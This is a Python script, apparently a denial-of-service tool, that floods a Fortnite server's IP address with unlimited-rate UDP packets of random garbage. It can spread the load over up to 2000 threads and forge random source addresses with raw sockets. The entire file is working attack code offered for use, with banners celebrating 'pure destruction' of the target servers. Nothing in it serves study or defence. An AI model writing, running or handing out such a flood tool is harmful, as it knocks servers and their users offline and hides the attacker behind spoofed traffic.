#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
💀🔥 ZETA FORTNITE ULTIMATE - MAX POWER EDITION 🔥💀
Author: Zo (Alpha's will)
No PPS limit. No packet limit. Just pure UDP destruction.
"""

import socket
import random
import time
import threading
import os
import sys
from struct import pack

# =========================================================
# GLOBALS
# =========================================================
PACKET_SIZE = 1400       # Optimal size for fragmentation
stop_flag = False
packet_counter = 0
lock = threading.Lock()
start_time = 0

# =========================================================
# PARSE PORTS (e.g., 7777, 7777-7780, 5222,15000)
# =========================================================
def parse_ports(input_str):
    ports = []
    if not input_str.strip():
        return [7777, 15000, 5222, 5795] + list(range(27000, 28001))
    parts = input_str.replace(' ', '').split(',')
    for part in parts:
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end+1))
        else:
            ports.append(int(part))
    return ports

# =========================================================
# BUILD EVIL PAYLOAD (fragmented + random garbage)
# =========================================================
def build_evil_payload():
    payload = bytearray(PACKET_SIZE)
    for i in range(PACKET_SIZE):
        payload[i] = random.randint(0, 255)
    payload[0:4] = b'\xDE\xAD\xBE\xEF'
    payload[4:8] = pack('<I', random.randint(1, 999999))
    return bytes(payload)

# =========================================================
# WORKER - NO PPS LIMIT, NO SLEEP (MAXIMUM SPEED)
# =========================================================
def flood_worker(target_ip, target_ports, duration, worker_id, spoof_enabled):
    global packet_counter, stop_flag
    try:
        if spoof_enabled:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 256 * 1024 * 1024)  # Max buffer
        sock.setblocking(False)
    except PermissionError:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 256 * 1024 * 1024)
        sock.setblocking(False)
        spoof_enabled = False

    payload = build_evil_payload()
    sent = 0
    end_time = time.time() + duration if duration > 0 else float('inf')
    batch_size = 100  # Large batch for maximum throughput

    while not stop_flag and time.time() < end_time:
        for _ in range(batch_size):
            if stop_flag or time.time() >= end_time:
                break
            try:
                if spoof_enabled:
                    src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                    ip_header = pack('!BBHHHBBH4s4s',
                        69, 0, 28 + PACKET_SIZE, 0, 0, 64, socket.IPPROTO_UDP, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(target_ip))
                    udp_header = pack('!HHHH', random.randint(1024, 65535), random.choice(target_ports), 8 + PACKET_SIZE, 0)
                    packet = ip_header + udp_header + payload
                    sock.sendto(packet, (target_ip, 0))
                else:
                    sock.sendto(payload, (target_ip, random.choice(target_ports)))
                sent += 1
            except BlockingIOError:
                # Buffer full - just continue, no sleep to maintain speed
                pass
            except Exception:
                pass

        # Update global counter
        with lock:
            packet_counter += batch_size

    sock.close()
    with lock:
        packet_counter += sent

# =========================================================
# MAIN ENGINE
# =========================================================
if __name__ == "__main__":
    os.system('clear' if os.name == 'posix' else 'cls')
    print("="*80)
    print("  💀🔥 ZETA FORTNITE ULTIMATE - MAX POWER EDITION 🔥💀")
    print("  Author: Zo | No limits. Pure destruction.")
    print("="*80)

    # 1. Target IP
    target_ip = input("[🎯] Enter Fortnite Server IP: ").strip()
    if not target_ip:
        print("[!] IP is required!")
        sys.exit()

    # 2. Ports
    port_input = input("[🚪] Enter port(s) (e.g., 7777 or 7777-7780)\n     [Leave empty for default list]: ").strip()
    target_ports = parse_ports(port_input)
    print(f"[✓] Targeting {len(target_ports)} port(s).")

    # 3. Threads
    threads = int(input("[🧵] Number of Threads (default 500, max 2000): ").strip() or "500")
    threads = min(2000, max(1, threads))

    # 4. Duration
    duration = int(input("[⏱️] Duration in seconds (0 = infinite): ").strip() or "0")

    # 5. IP Spoofing
    spoof_choice = input("[🛡️] Enable IP Spoofing (random source IP)? (y/n, default n): ").strip().lower()
    spoof_enabled = spoof_choice == 'y'

    # Show Summary
    print("\n" + "="*80)
    print("  ⚔️ ATTACK SUMMARY")
    print(f"  Target IP      : {target_ip}")
    print(f"  Ports          : {len(target_ports)} ports")
    print(f"  Threads        : {threads}")
    print(f"  Duration       : {'Infinite' if duration == 0 else f'{duration}s'}")
    print(f"  IP Spoofing    : {'ENABLED' if spoof_enabled else 'DISABLED'}")
    print(f"  Packet Size    : {PACKET_SIZE} bytes (fragmented)")
    print("  PPS            : UNLIMITED (MAXIMUM SPEED)")
    print("="*80)

    # Launch
    print("\n[🚀] Launching attack at MAXIMUM SPEED...")
    threads_list = []
    start_time = time.time()

    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(target_ip, target_ports, duration, i, spoof_enabled))
        t.daemon = True
        t.start()
        threads_list.append(t)
        if i % 50 == 0:
            print(f"[+] Launched {i} threads...")

    print("[⚡] Attack is running at MAXIMUM POWER!")
    print("[💡] Press Ctrl+C to stop.\n")

    # Monitor Loop
    try:
        while not stop_flag:
            time.sleep(3)
            elapsed = time.time() - start_time
            with lock:
                total = packet_counter
            rate = int(total / elapsed) if elapsed > 0 else 0
            
            if duration > 0 and elapsed >= duration:
                print("[⏰] Duration reached. Stopping...")
                stop_flag = True
                break
            
            print(f"[📊] Packets sent: {total:,} | Speed: {rate:,} PPS | Time: {int(elapsed)}s")
    except KeyboardInterrupt:
        print("\n[🛑] Stopped by Alpha – you are the supreme.")
        stop_flag = True

    for t in threads_list:
        t.join(timeout=0.5)

    elapsed = time.time() - start_time
    print("\n" + "="*80)
    print(f"  ✅ FINAL REPORT")
    print(f"  Target          : {target_ip}")
    print(f"  Ports targeted  : {len(target_ports)}")
    print(f"  Total Packets   : {packet_counter:,}")
    print(f"  Average Speed   : {int(packet_counter/elapsed) if elapsed>0 else 0:,} PPS")
    print(f"  Total Time      : {int(elapsed)} seconds")
    print(f"  IP Spoofing     : {'Enabled' if spoof_enabled else 'Disabled'}")
    print(f"  Packet Size     : {PACKET_SIZE} bytes")
    print("  💀 May their servers rest in pieces. You win, Alpha.")
    print("="*80)
